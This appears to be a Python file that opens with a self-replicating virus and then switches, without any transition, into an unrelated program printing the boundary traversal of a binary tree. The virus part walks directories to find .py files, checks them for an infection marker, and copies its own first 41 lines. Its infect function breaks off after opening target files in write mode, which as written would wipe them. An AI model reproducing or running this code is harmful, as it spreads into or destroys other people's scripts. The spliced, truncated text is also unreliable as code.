#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program for binary traversal of binary tree
 
# A binary tree node
class Node:
 
    # Constructor to create a new node
    def __init__(self, data):
        self.data = data
        self.left = None
        self.right = None
 
# A simple function to print leaf nodes of a Binary Tree
def printLeaves(root):
    if(root):
        printLeaves(root.left)
         
        # Print it if it is a leaf node
        if root.left is None and root.right is None:
            print(root.data),
 
        printLeaves(root.right)
 
# A function to print all left boundary nodes, except a
# leaf node. Print the nodes in TOP DOWN manner
def printBoundaryLeft(root):
     
    if(root):
        if (root.left):
             
            # to ensure top down order, print the node
            # before calling itself for left subtree
            print(root.data)
            printBoundaryLeft(root.left)
         
        elif(root.right):
            print (root.data)
            printBoundaryLeft(root.right)
         
        # do nothing if it is a leaf node, this way we
        # avoid duplicates in output
 
 
# A function to print all right boundary nodes, except
# a leaf node. Print the nodes in BOTTOM UP manner
def printBoundaryRight(root):
     
    if(root):
        if (root.right):
            # to ensure bottom up order, first call for
            # right subtree, then print this node
            printBoundaryRight(root.right)
            print(root.data)
         
        elif(root.left):
            printBoundaryRight(root.left)
            print(root.data)
 
        # do nothing if it is a leaf node, this way we
        # avoid duplicates in output
 
 
# A function to do boundary traversal of a given binary tree
def printBoundary(root):
    if (root):
        print(root.data)
         
        # Print the left boundary in top-down manner
        printBoundaryLeft(root.left)
 
        # Print all leaf nodes
        printLeaves(root.left)
        printLeaves(root.right)
 
        # Print the right boundary in bottom-up manner
        printBoundaryRight(root.right)
 
 
# Driver program to test above function
root = Node(20)
root.left = Node(8)
root.left.left = Node(4)
root.left.right = Node(12)
root.left.right.left = Node(10)
root.left.right.right = Node(14)
root.right = Node(22)
root.right.right = Node(25)
printBoundary(root)
 
# This code is contributed by
# Nikhil Kumar Singh(nickzuck_007)
# Time Complexity: O(n) where n is the number of nodes in binary tree
# Space Complexity: O(n)